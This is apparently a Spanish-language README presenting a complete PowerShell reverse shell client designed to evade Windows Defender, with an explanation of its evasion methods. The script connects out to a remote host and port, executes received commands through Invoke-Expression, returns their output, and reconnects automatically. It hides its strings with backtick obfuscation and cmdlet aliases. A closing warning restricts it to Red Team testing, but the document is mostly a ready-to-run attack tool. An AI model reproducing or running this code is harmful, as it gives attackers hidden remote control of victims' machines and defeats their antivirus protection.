# Reverse Shell Bypass Windows PowerShell

Este script de PowerShell es un cliente de shell inverso, permite eludir de manera efectiva la seguridad de Windows Defender. El script recibe datos del servidor remoto a través de una conexión TCP. Estos datos se leen en un búfer, que es simplemente un bloque de memoria reservado para almacenar los datos temporales. En este caso, el búfer es un array de bytes con una longitud de 1024.
Dentro del bucle de lectura, el script lee los datos del búfer y los decodifica utilizando la codificación ASCII. 

## POC
[![Bypass Reverse Shell Windows Defender](https://i.imgur.com/M968BwB.png)](https://www.linkedin.com/feed/update/urn:li:ugcPost:7196028677061586944/)

## Funciones

1. **Conexión TCP**: El script intenta establecer una conexión TCP con un servidor remoto.

2. **Ejecución de comandos**: Los comandos enviados por el servidor remoto se ejecutan en la máquina local.

3. **Envío de la salida del comando**: La salida de los comandos ejecutados se envía de vuelta al servidor remoto.

4. **Reconexión automática**: Si la conexión se cierra por cualquier motivo, el script intentará reconectar después de un intervalo de tiempo especificado.

## Bypass Logico

El script utiliza varias técnicas para eludir Windows Defender sin necesidad de **third party tools**. 

- **Alias de cmdlets**: Se utilizan alias para los cmdlets de PowerShell para hacer que el código sea menos reconocible.

- **Codificación de cadenas**: Las cadenas en el código están codificadas para evitar la detección por parte de las soluciones de seguridad basadas en firmas.

- **Reintentos de conexión silenciosos**: Si la conexión se cierra, el script intentará reconectar silenciosamente.

```
# Author: Omar Salazar
# Define constants
$ip = "192.168.1.1" 
$port = 4444
$retryInterval = 10  
$maxRetries = 5  

# Create aliases for cmdlets
Set-Alias -Name "n" -Value "New-Object"
Set-Alias -Name "s" -Value "Start-Sleep"
Set-Alias -Name "g" -Value "Get-Location"

# Main loop
do {
    # Create TCP client
    $c = n S`ySt`em.N`eT.`s`ock`eTs.TC`PC`li`eNt($ip, $port)
    $s = $c.GetStream()

    # Buffer for incoming data
    $b = n Byt`e[] 1024
    $d = ""

    # Read loop
    while (($x = $s.Read($b, 0, $b.Length)) -ne 0) {
        # Decode and execute command
        $e = (n -TypeName System.Text.ASCIIEncoding).GetString($b,0, $x)
        $f = (iex $e 2>&1 | Out-String)

        # Prepare and send response
        $g = $f + (g).Path + '> '
        $h = ([text.encoding]::ASCII).GetBytes($g)
        $s.Write($h,0,$h.Length)
        $s.Flush()
    }

    # Close connection and wait before trying again
    $c.Close()
    s -Seconds $retryInterval
    $maxRetries--
} while ($maxRetries -gt 0)
```

## Descripción

Aquí, `n -TypeName System.Text.ASCIIEncoding` crea un nuevo objeto de tipo `System.Text.ASCIIEncoding`, que es una clase en .NET que proporciona métodos para codificar y decodificar texto en ASCII. Luego, el método GetString de este objeto se utiliza para decodificar los bytes en el búfer en una cadena de texto.

Una vez que los datos se han decodificado en una cadena de texto, se ejecutan como un comando de PowerShell con `iex $e 2>&1 | Out-String. iex` es un alias para `Invoke-Expression`, que ejecuta una cadena de texto como un comando de PowerShell. `2>&1` redirige los errores a la salida estándar, y `Out-String` convierte la salida en una cadena de texto.

## Advertencia

Este script puede ser utilizado para fines maliciosos si cae en las manos equivocadas. Es de uso exclusivo para pruebas de Red Team, asegúrate de entender completamente lo que hace un script antes de ejecutarlo. No me hago responsables de cualquier uso indebido de este script.
